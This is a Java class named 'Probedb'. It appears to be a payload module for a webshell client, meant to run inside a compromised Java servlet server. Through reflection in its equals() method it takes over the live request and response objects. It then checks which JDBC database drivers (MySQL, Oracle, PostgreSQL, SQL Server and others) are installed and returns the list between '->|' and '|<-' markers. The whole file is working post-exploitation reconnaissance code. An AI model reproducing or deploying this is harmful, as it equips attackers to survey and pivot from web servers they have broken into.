package base;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;

public class Probedb {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs;

    @Override
    public boolean equals(Object obj) {
        try {
            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
        } catch (Exception e) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception ex) {
                    try {
                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                    } catch (Exception ignored) {

                    }
                }
            }
        }

        cs = "UTF-8";
        StringBuffer output = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            output.append(ProbedbCode(request));
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }
        try {
            response.getWriter().print(tag_s + output.toString() + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    String ProbedbCode(HttpServletRequest r) {
        String[] drivers = new String[]{
                "com.mysql.jdbc.Driver",
                "com.mysql.cj.jdbc.Driver",
                "oracle.jdbc.driver.OracleDriver",
                "org.postgresql.Driver",
                "weblogic.jdbc.mssqlserver4.Driver",
                "com.microsoft.sqlserver.jdbc.SQLServerDriver",
                "com.inet.pool.PoolDriver",
        };
        String ret = "";
        for (int i = 0; i < drivers.length; i++) {
            try {
                Class.forName(drivers[i]);
                ret += drivers[i] + "\t1\n";
            } catch (Exception e) {
                ret += drivers[i] + "\t0\n";
            }
        }
        return ret;
    }
}
